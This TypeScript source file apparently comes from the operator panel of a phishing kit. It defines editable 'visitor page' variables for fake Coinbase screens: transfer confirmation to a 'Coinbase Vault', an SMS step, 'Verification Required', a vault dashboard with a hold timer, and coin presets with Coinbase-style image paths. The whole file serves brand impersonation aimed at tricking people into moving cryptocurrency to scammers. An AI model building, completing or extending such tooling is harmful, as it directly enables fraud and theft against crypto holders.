/**
 * Configurable visitor page variables — defaults and field schemas for the admin panel.
 */
export interface PageVarField {
	key: string;
	label: string;
	type: 'text' | 'number' | 'select';
	placeholder?: string;
	options?: { value: string; label: string }[];
}

export interface CoinPreset {
	name: string;
	symbol: string;
	img: string;
}

export const COIN_PRESETS: Record<string, CoinPreset> = {
	BTC: {
		name: 'Bitcoin',
		symbol: 'BTC',
		img: '/_next/static/media/bitcoin.44da609b.png'
	},
	ETH: {
		name: 'Ethereum',
		symbol: 'ETH',
		img: '/_next/static/media/ethereum.0a38a4d0.png'
	},
	USDT: {
		name: 'Tether',
		symbol: 'USDT',
		img: '/_next/static/media/tether.84db185b.png'
	},
	SOL: {
		name: 'Solana',
		symbol: 'SOL',
		img: '/_next/static/media/solana.0c81d69c.png'
	},
	XRP: {
		name: 'XRP',
		symbol: 'XRP',
		img: '/_next/static/media/xrp.cebc03fb.png'
	},
	BNB: {
		name: 'BNB',
		symbol: 'BNB',
		img: '/_next/static/media/bnb.b1d88c4b.png'
	}
};

const COIN_OPTIONS = Object.entries(COIN_PRESETS).map(([value, c]) => ({
	value,
	label: `${c.name} (${value})`
}));

export const PAGE_VAR_SCHEMAS: Record<string, PageVarField[]> = {
	'Coinbase/Confirm Transfer': [
		{ key: 'coin', label: 'Asset', type: 'select', options: COIN_OPTIONS },
		{ key: 'amount', label: 'Amount', type: 'text', placeholder: '0.2' },
		{ key: 'amountUsd', label: 'Amount (USD)', type: 'text', placeholder: '15636.29' },
		{ key: 'from', label: 'From', type: 'text', placeholder: 'Coinbase' },
		{ key: 'to', label: 'To', type: 'text', placeholder: 'Coinbase Vault' },
		{ key: 'networkFee', label: 'Network fee', type: 'text', placeholder: 'Free' }
	],
	'Coinbase/Vault SMS': [
		{ key: 'phoneMasked', label: 'Phone (masked)', type: 'text', placeholder: '+xx xxxx 22' }
	],
	'Coinbase/Verification Required': [
		{ key: 'coin', label: 'Asset', type: 'select', options: COIN_OPTIONS },
		{ key: 'amount', label: 'Amount', type: 'text', placeholder: '0.2' },
		{ key: 'status', label: 'Status label', type: 'text', placeholder: 'Pending' }
	],
	'Coinbase/Vault Dashboard': [
		{ key: 'coin', label: 'Primary asset', type: 'select', options: COIN_OPTIONS },
		{ key: 'totalValue', label: 'Total vault value', type: 'text', placeholder: '$0.00' },
		{ key: 'pendingUsd', label: 'Pending (USD)', type: 'text', placeholder: '$15,640.00' },
		{ key: 'availableUsd', label: 'Available on Coinbase', type: 'text', placeholder: '$0.00' },
		{ key: 'assetAmount', label: 'Asset amount', type: 'text', placeholder: '0.0000' },
		{ key: 'assetLabel', label: 'Wallet label', type: 'text', placeholder: 'test' },
		{ key: 'holdMinutes', label: 'Hold timer (minutes)', type: 'text', placeholder: '60' }
	],
	'Coinbase/Transfer from Coinbase': [
		{ key: 'subtitle', label: 'Subtitle', type: 'text', placeholder: 'Move your crypto into your vault...' }
	]
};

export const PAGE_VAR_DEFAULTS: Record<string, Record<string, string>> = {
	'Coinbase/Transfer from Coinbase': {
		subtitle: 'Move your crypto into your vault for full control of your keys.'
	},
	'Coinbase/Confirm Transfer': {
		coin: 'BTC',
		amount: '0.2',
		amountUsd: '15636.29',
		from: 'Coinbase',
		to: 'Coinbase Vault',
		networkFee: 'Free'
	},
	'Coinbase/Vault SMS': {
		phoneMasked: '+xx xxxx 22'
	},
	'Coinbase/Verification Required': {
		coin: 'BTC',
		amount: '0.2',
		status: 'Pending'
	},
	'Coinbase/Vault Dashboard': {
		coin: 'BTC',
		totalValue: '$0.00',
		pendingUsd: '$15,640.00',
		availableUsd: '$0.00',
		assetAmount: '0.0000',
		assetLabel: 'test',
		holdMinutes: '60'
	}
};

export function pageVarSettingKey(brand: string, page: string): string {
	return `page.vars.${brand}/${page}`;
}

export function getSchema(brand: string, page: string): PageVarField[] {
	return PAGE_VAR_SCHEMAS[`${brand}/${page}`] ?? [];
}

export function getDefaults(brand: string, page: string): Record<string, string> {
	return { ...(PAGE_VAR_DEFAULTS[`${brand}/${page}`] ?? {}) };
}

/** Expand coin + amounts into display-ready variables for the visitor shim. */
export function resolveDisplayVars(raw: Record<string, string>): Record<string, string> {
	const out = { ...raw };
	const coinKey = (raw.coin || 'BTC').toUpperCase();
	const preset = COIN_PRESETS[coinKey] ?? COIN_PRESETS.BTC;
	out.coin = coinKey;
	out.coinName = preset.name;
	out.coinSymbol = preset.symbol;
	out.coinImg = preset.img;

	const amount = raw.amount || '0';
	out.amountDisplay = `${amount} ${preset.symbol}`;
	out.amountAssetLine = `${preset.name} (${preset.symbol})`;

	const amountUsd = raw.amountUsd || '';
	if (amountUsd) {
		const usd = amountUsd.startsWith('$') ? amountUsd : `$${amountUsd}`;
		out.amountUsdDisplay = usd;
	}

	if (raw.pendingUsd) {
		out.pendingUsdDisplay = raw.pendingUsd.startsWith('$') ? raw.pendingUsd : `$${raw.pendingUsd}`;
	}
	if (raw.availableUsd && !raw.availableUsd.startsWith('$')) {
		out.availableUsd = `$${raw.availableUsd}`;
	}
	if (raw.totalValue && !raw.totalValue.startsWith('$')) {
		out.totalValue = `$${raw.totalValue}`;
	}

	out.inProgressLabel = raw.inProgressLabel || `${preset.symbol} in progress`;
	out.transferButton = `Transfer ${preset.symbol}`;
	out.verifyCoinPhrase = preset.symbol;
	out.assetAmountDisplay = `${raw.assetAmount || '0.0000'} ${preset.symbol}`;

	return out;
}

/** Map page-var schema fields to TemplateInput for VisitorDialog / templates.ts */
export function schemaToTemplateInputs(brand: string, page: string) {
	return getSchema(brand, page).map((f) => ({
		name: f.key,
		placeholder: f.placeholder || '',
		type: f.type === 'select' ? 'select' : f.type === 'number' ? 'number' : 'text',
		inputMode: f.type === 'number' ? 'decimal' : undefined,
		options: f.options
	}));
}
